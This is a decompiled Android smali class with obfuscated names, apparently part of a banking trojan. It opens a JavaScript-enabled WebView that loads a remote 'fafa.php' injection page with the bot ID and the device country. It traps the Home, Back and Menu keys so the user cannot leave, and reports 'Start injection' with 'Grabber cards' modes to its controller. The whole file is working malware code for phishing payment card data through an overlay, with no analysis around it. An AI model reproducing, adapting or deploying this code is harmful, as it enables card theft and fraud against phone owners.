.class public Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;
.super Landroid/app/Activity;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$a;,
        Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;
    }
.end annotation


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/c;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    return-void
.end method

.method public onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "name"

    const-string v2, "false"

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    return p2

    :cond_0
    const/4 v0, 0x4

    if-ne p1, v0, :cond_1

    return p2

    :cond_1
    const/16 v0, 0x52

    if-ne p1, v0, :cond_2

    return p2

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method protected onStart()V
    .locals 7

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "name"

    const-string v2, "true"

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "str"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_0

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_5

    :cond_0
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, ""

    :try_start_0
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "urlInj"

    invoke-virtual {v3, p0, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v1, v3

    :catch_0
    new-instance v3, Landroid/webkit/WebView;

    invoke-direct {v3, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v4

    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v4, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;

    invoke-direct {v4, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$1;)V

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v4, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$a;

    invoke-direct {v4, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$a;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$1;)V

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v2

    iget-object v2, v2, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v2}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/fafa.php?f="

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "&p="

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v1, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "|"

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->setContentView(Landroid/view/View;)V

    const-string v1, "grab3"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v0, "Info + Grabber cards mini"

    :cond_1
    const-string v1, "grab1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v0, "Info + Grabber cards"

    :cond_2
    const-string v1, "grab4"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    const-string v0, "Grabber cards mini"

    :cond_3
    const-string v1, "grab2"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v0, "Grabber cards"

    :cond_4
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "4"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "p="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v6, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|Start injection "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "|"

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, p0, v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_5
    return-void
.end method

.method protected onStop()V
    .locals 3

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "name"

    const-string v2, "false"

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
